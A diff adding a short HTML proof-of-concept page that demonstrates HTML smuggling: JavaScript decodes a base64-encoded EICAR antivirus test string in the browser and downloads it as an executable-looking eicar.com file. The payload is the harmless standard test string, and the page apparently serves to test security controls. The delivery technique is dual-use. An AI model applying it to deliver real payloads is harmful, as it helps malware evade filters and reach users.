@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>HTML Smuggling – EICAR Test</title>
+</head>
+<body>
+<h2>HTML Smuggling PoC – EICAR Test File</h2>
+<button onclick="downloadFile()">Download EICAR</button>
+
+<script>
+function downloadFile() {
+    // EICAR 테스트 문자열을 base64로 인코딩한 값
+    // X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
+    let b64 = "WDVPIVAlQEFQWzRcUFpYNTQoUF4pN0NDKTd9JEVJQ0FSLVNUQU5EQVJELUFOVElWSVJVUy1URVNULUZJTEUhJEgrSCo=";
+
+    let bytes = atob(b64);
+    let arr = new Uint8Array(bytes.length);
+
+    for (let i = 0; i < bytes.length; i++) {
+        arr[i] = bytes.charCodeAt(i);
+    }
+
+    // 실행파일처럼 보이도록 octet-stream + .com 으로
+    let blob = new Blob([arr], {type: "application/octet-stream"});
+    let a = document.createElement("a");
+    a.href = URL.createObjectURL(blob);
+    a.download = "eicar.com";
+    a.click();
+}
+</script>
+</body>
+</html>
